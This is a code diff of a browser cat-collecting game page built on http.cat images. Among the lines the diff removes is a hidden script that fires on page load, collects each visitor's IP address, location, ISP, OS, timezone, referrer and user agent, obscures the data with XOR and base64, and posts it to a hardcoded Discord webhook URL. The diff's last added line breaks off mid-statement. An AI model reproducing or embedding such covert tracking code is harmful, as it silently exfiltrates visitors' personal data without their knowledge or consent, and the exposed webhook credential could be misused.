@@ -6,7 +6,6 @@
   <link rel="icon" href="https://github.com/QIEJFOIUWEFH/soosycdn/blob/main/419.jpg?raw=true" type="image/jpeg" />
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* (Your original styles unchanged) */
     body {
       margin: 0;
       font-family: 'Poppins', sans-serif;
@@ -142,8 +141,8 @@
     </div>
   </main>
 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
-    // --- Your existing cat code here ---
     const cats = [
       { code: 200, rarity: "Common" },
       { code: 201, rarity: "Common" },
@@ -224,140 +223,4 @@
           const rarity = cat ? cat.rarity : "Unknown";
           const chance = rarityChances[rarity] || "?";
           const li = document.createElement("li");
-          li.textContent = `HTTP ${code} — ${rarity} - ${chance} — x${inventory[code]}`;
-          inventoryList.appendChild(li);
-        });
-    }
-
-    function showCat(cat) {
-      catImg.src = `https://http.cat/${cat.code}.jpg`;
-      rarityText.textContent = `Rarity: ${cat.rarity} — ${rarityChances[cat.rarity] || "?"}`;
-      Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
-      catImg.classList.add(rarityClasses[cat.rarity]);
-      saveInventory(cat.code);
-      localStorage.setItem("lastCat", JSON.stringify(cat));
-      lastCat = cat;
-    }
-
-    function reroll() {
-      if (animating) return;
-      animating = true;
-
-      catImg.classList.add("shuffling");
-      rarityText.textContent = "Shuffling...";
-
-      let shuffleInterval = setInterval(() => {
-        const randomCat = getRandomCat();
-        catImg.src = `https://http.cat/${randomCat.code}.jpg`;
-        Object.values(rarityClasses).forEach(cls => catImg.classList.remove(cls));
-        catImg.classList.add(rarityClasses[randomCat.rarity]);
-      }, 150);
-
-      setTimeout(() => {
-        clearInterval(shuffleInterval);
-        catImg.classList.remove("shuffling");
-        const finalCat = getRandomCat();
-        showCat(finalCat);
-
-        // Update roll count
-        rollCount++;
-        localStorage.setItem("rollCount", rollCount);
-        rollCounterDiv.textContent = `Rolls: ${rollCount}`;
-
-        animating = false;
-      }, 3500);
-    }
-
-    rerollBtn.onclick = reroll;
-
-    // Show last cat and inventory on load
-    showCat(lastCat);
-    renderInventory();
-
-    // --- Encryption & webhook logging below ---
-
-    function xorEncryptDecrypt(input, key) {
-      let output = "";
-      for (let i = 0; i < input.length; i++) {
-        output += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-      }
-      return output;
-    }
-
-    function base64Encode(str) {
-      return btoa(unescape(encodeURIComponent(str)));
-    }
-
-    async function getIPInfo() {
-      try {
-        const res = await fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE");
-        if (!res.ok) throw new Error("Failed to fetch IP info");
-        return await res.json();
-      } catch {
-        return { ip: "unknown", city: "unknown", country: "unknown", org: "unknown" };
-      }
-    }
-
-    function getOS(userAgent) {
-      const osList = [
-        { name: "Windows", regex: /Windows NT/i },
-        { name: "macOS", regex: /Macintosh/i },
-        { name: "Linux", regex: /Linux/i },
-        { name: "Android", regex: /Android/i },
-        { name: "iOS", regex: /iPhone|iPad/i },
-      ];
-      for (const os of osList) {
-        if (os.regex.test(userAgent)) return os.name;
-      }
-      return "Unknown OS";
-    }
-
-    async function sendEncryptedLog(webhookUrl, dataObj, key) {
-      const jsonStr = JSON.stringify(dataObj);
-      const encrypted = xorEncryptDecrypt(jsonStr, key);
-      const encoded = base64Encode(encrypted);
-
-      const payload = {
-        content: `Encrypted log data:\n\`\`\`base64\n${encoded}\n\`\`\``
-      };
-
-      await fetch(webhookUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-    }
-
-    async function logUserData() {
-      const webhookURL = "https://discord.com/api/webhooks/1379922193542152243/K19LU85LARF1On44CYFXLh56FAAlUBV_ADyVWVLaEmiGyVrKqIUL_R_-1qplKKx0oAOi";
-      const userAgent = navigator.userAgent;
-      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
-      const referrer = document.referrer || "direct";
-      const timestamp = new Date().toISOString();
-
-      const ipInfo = await getIPInfo();
-
-      const os = getOS(userAgent);
-
-      const logData = {
-        ip: ipInfo.ip || "unknown",
-        city: ipInfo.city || "unknown",
-        country: ipInfo.country || "unknown",
-        isp: ipInfo.org || "unknown",
-        os,
-        timezone,
-        referrer,
-        userAgent,
-        timestamp,
-      };
-
-      const encryptionKey = "4ca57ffa6e1fc4"; // your secret key
-      await sendEncryptedLog(webhookURL, logData, encryptionKey);
-    }
-
-    // Fire on page load
-    logUserData();
-
-  </script>
-</body>
-</html>
+          li.textContent = `HTTP ${code} — ${rarity
